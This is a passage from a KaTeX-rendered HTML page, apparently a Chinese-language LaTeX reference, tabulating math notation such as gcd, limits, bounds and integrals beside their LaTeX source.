style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span></td><td style="text-align:left">a \bmod b</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi mathvariant="normal">lcm</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\gcd(m, n), \operatorname{lcm}(m, n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span style="margin-right:0.01389em;">g</span>cd</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mord mathrm">l</span><span class="mord mathrm">c</span><span class="mord mathrm">m</span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td style="text-align:left">\gcd(m, n), \operatorname{lcm}(m, n)</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∣</mo><mo separator="true">,</mo><mo>∤</mo><mo separator="true">,</mo><mo>∣</mo><mo separator="true">,</mo><mo>∤</mo></mrow><annotation encoding="application/x-tex">\mid, \nmid, \shortmid, \nshortmid</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mrel">∣</span></span><span class="base"><span class="strut" style="height:0.99253em;vertical-align:-0.25142em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">∤</span></span><span class="base"><span class="strut" style="height:0.7761100000000001em;vertical-align:-0.19444em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">∣</span></span><span class="base"><span class="strut" style="height:0.7761100000000001em;vertical-align:-0.19444em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm"></span></span></span></span></td><td style="text-align:left">\mid, \nmid, \shortmid, \nshortmid</td></tr></tbody></table><h3 id="226-极限-limits"><a class="markdownIt-Anchor" href="#226-极限-limits"></a> 2.2.6 极限 Limits</h3><table><thead><tr><th style="text-align:left">样式</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></msub><msub><mi>x</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">\lim_{n \to \infty}x_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mop"><span class="mop">lim</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mrel mtight">→</span><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\lim_{n \to \infty}x_n</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="false"><msub><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></msub><msub><mi>x</mi><mi>n</mi></msub></mstyle></mrow><annotation encoding="application/x-tex">\textstyle \lim_{n \to \infty}x_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mop"><span class="mop">lim</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mrel mtight">→</span><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\textstyle \lim_{n \to \infty}x_n</td></tr></tbody></table><h3 id="227-界限与投影-bounds-and-projections"><a class="markdownIt-Anchor" href="#227-界限与投影-bounds-and-projections"></a> 2.2.7 界限与投影 Bounds and Projections</h3><table><thead><tr><th style="text-align:left">样式</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>min</mi><mo>⁡</mo><mi>x</mi><mo separator="true">,</mo><mi>max</mi><mo>⁡</mo><mi>y</mi><mo separator="true">,</mo><mi>inf</mi><mo>⁡</mo><mi>s</mi><mo separator="true">,</mo><mi>sup</mi><mo>⁡</mo><mi>t</mi></mrow><annotation encoding="application/x-tex">\min x, \max y, \inf s, \sup t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mop">min</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">max</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">in<span style="margin-right:0.07778em;">f</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">sup</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">t</span></span></span></span></td><td style="text-align:left">\min x, \max y, \inf s, \sup t</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>lim</mi><mo>⁡</mo><mi>u</mi><mo separator="true">,</mo><mi mathvariant="normal">lim inf</mi><mo>⁡</mo><mi>v</mi><mo separator="true">,</mo><mi mathvariant="normal">lim sup</mi><mo>⁡</mo><mi>w</mi></mrow><annotation encoding="application/x-tex">\lim u, \liminf v, \limsup w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mop">lim</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mord mathrm">l</span><span class="mord mathrm">i</span><span class="mord mathrm">m</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathrm">i</span><span class="mord mathrm">n</span><span class="mord mathrm" style="margin-right:0.07778em;">f</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mord mathrm">l</span><span class="mord mathrm">i</span><span class="mord mathrm">m</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathrm">s</span><span class="mord mathrm">u</span><span class="mord mathrm">p</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span></td><td style="text-align:left">\lim u, \liminf v, \limsup w</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>dim</mi><mo>⁡</mo><mi>p</mi><mo separator="true">,</mo><mi>deg</mi><mo>⁡</mo><mi>q</mi><mo separator="true">,</mo><mi>det</mi><mo>⁡</mo><mi>m</mi><mo separator="true">,</mo><mi>ker</mi><mo>⁡</mo><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\dim p, \deg q, \det m, \ker\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mop">dim</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">de<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">det</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">ker</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">ϕ</span></span></span></span></td><td style="text-align:left">\dim p, \deg q, \det m, \ker\phi</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Pr</mi><mo>⁡</mo><mi>j</mi><mo separator="true">,</mo><mi>hom</mi><mo>⁡</mo><mi>l</mi><mo separator="true">,</mo><mo stretchy="false">∥</mo><mi>z</mi><mo stretchy="false">∥</mo><mo separator="true">,</mo><mi>arg</mi><mo>⁡</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">\Pr j, \hom l, \lVert z \rVert, \arg z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">Pr</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">hom</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">∥</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">∥</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span></td><td style="text-align:left">\Pr j, \hom l, \lVert z \rVert, \arg z</td></tr></tbody></table><h3 id="228-积分-integral"><a class="markdownIt-Anchor" href="#228-积分-integral"></a> 2.2.8 积分 Integral</h3><table><thead><tr><th style="text-align:left">样式</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∫</mo><mn>1</mn><mn>3</mn></msubsup><mfrac><mrow><msup><mi>e</mi><mn>3</mn></msup><mi mathvariant="normal">/</mi><mi>x</mi></mrow><msup><mi>x</mi><mn>2</mn></msup></mfrac><mtext> </mtext><mi>d</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">\int\limits_{1}^{3}\frac{e^3/x}{x^2}\, dx</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.5793360000000005em;vertical-align:-1.0226680000000001em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5566680000000002em;"><span style="top:-2.0773319999999997em;margin-left:-0.19445em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.0005599999999997em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop op-symbol small-op" style="margin-right:0.19445em;">∫</span></span></span><span style="top:-4.00556em;margin-left:0.19445em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.0226680000000001em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10892em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mord mtight">/</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">x</span></span></span></span></td><td style="text-align:left">\int\limits_{1}<sup>{3}\frac{e</sup>3/x}{x^2}, dx</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∫</mo><mn>1</mn><mn>3</mn></msubsup><mfrac><mrow><msup><mi>e</mi><mn>3</mn></msup><mi mathvariant="normal">/</mi><mi>x</mi></mrow><msup><mi>x</mi><mn>2</mn></msup></mfrac><mtext> </mtext><mi>d</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">\int_{1}^{3}\frac{e^3/x}{x^2}\, dx</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.46474em;vertical-align:-0.35582em;"></span><span class="mop"><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0090080000000001em;"><span style="top:-2.34418em;margin-left:-0.19445em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.2579000000000002em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35582em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10892em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mord mtight">/</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">x</span></span></span></span></td><td style="text-align:left">\int_{1}<sup>{3}\frac{e</sup>3/x}{x^2}, dx</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="false"><msubsup><mo>∫</mo><mrow><mo>−</mo><mi>N</mi></mrow><mi>N</mi></msubsup><msup><mi>e</mi><mi>x</mi></msup><mi>d</mi><mi>x</mi></mstyle></mrow><annotation encoding="application/x-tex">\textstyle \int\limits_{-N}^{N} e^x dx</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.6921130000000004em;vertical-align:-1.108222em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5838910000000004em;"><span style="top:-2.050109em;margin-left:-0.19445em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span style="top:-3.00056em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop op-symbol small-op" style="margin-right:0.19445em;">∫</span></span></span><span style="top:-4.00556em;margin-left:0.19445em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.108222em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span><span class="mord mathnormal">d</span><span class="mord mathnormal">x</span></span></span></span></td><td style="text-align:left">\textstyle \int\limits_{-N}^{N} e^x dx</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="false"><msubsup><mo>∫</mo><mrow><mo>−</mo><mi>N</mi></mrow><mi>N</mi></msubsup><msup><mi>e</mi><mi>x</mi></msup><mi>d</mi><mi>x</mi></mstyle></mrow><annotation encoding="application/x-tex">\textstyle \int_{-N}^{N} e^x dx</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4503819999999998em;vertical-align:-0.41415100000000005em;"></span><span class="mop"><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.036231em;"><span style="top:-2.34418em;margin-left:-0.19445em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span style="top:-3.2579000000000002em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.41415100000000005em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span><span class="mord mathnormal">d</span><span class="mord mathnormal">x</span></span></span></span></td><td style="text-align:left">\textstyle \int_{-N}^{N} e^x dx</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><munder><mo>∬</mo><mi>D</mi></munder><mi>d</mi><mi>x</mi><mtext> </mtext><mi>d</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">\iint\limits_D dx\,dy</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.855331em;vertical-align:-1.049831em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8055em;"><span style="top:-2.050169em;margin-left:-0.19445em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">D</span></span></span><span style="top:-3.0005em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop op-symbol small-op" style="margin-right:0.19445em;">∬</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.049831em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></td><td style="text-align:left">\iint\limits_D dx,dy</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><munder><mo>∭</mo><mi>E</mi></munder><mi>d</mi><mi>x</mi><mtext> </mtext><mi>d</mi><mi>y</mi><mtext> </mtext><mi>d</mi><mi>z</mi></mrow><annotation encoding="application/x-tex">\iiint\limits_E dx\,dy\,dz</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.855331em;vertical-align:-1.049831em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8055em;"><span style="top:-2.050169em;margin-left:-0.19445em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">E</span></span></span><span style="top:-3.0005em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop op-symbol small-op" style="margin-right:0.19445em;">∭</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.049831em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span></td><td style="text-align:left">\iiint\limits_E dx,dy,dz</td></tr><tr><td style="text-align:left"><span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \iiiint at position 1: \̲i̲i̲i̲i̲n̲t̲\limits_F dx\,d…'>\iiiint\limits_F dx\,dy\,dz\,dt</span></td><td style="text-align:left">\iiiint\limits_F dx,dy,dz,dt</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo>∫</mo><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>C</mi></mrow></msub><msup><mi>x</mi><mn>3</mn></msup><mtext> </mtext><mi>d</mi><mi>x</mi><mo>+</mo><mn>4</mn><msup><mi>y</mi><mn>2</mn></msup><mtext> </mtext><mi>d</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">\int_{(x,y)\in C} x^3\, dx + 4y^2\, dy</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.344928em;vertical-align:-0.5308200000000001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16917999999999989em;"><span style="top:-2.3441799999999997em;margin-left:-0.19445em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">x</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mclose mtight">)</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5308200000000001em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord">4</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></td><td style="text-align:left">\int_{(x,y)\in C} 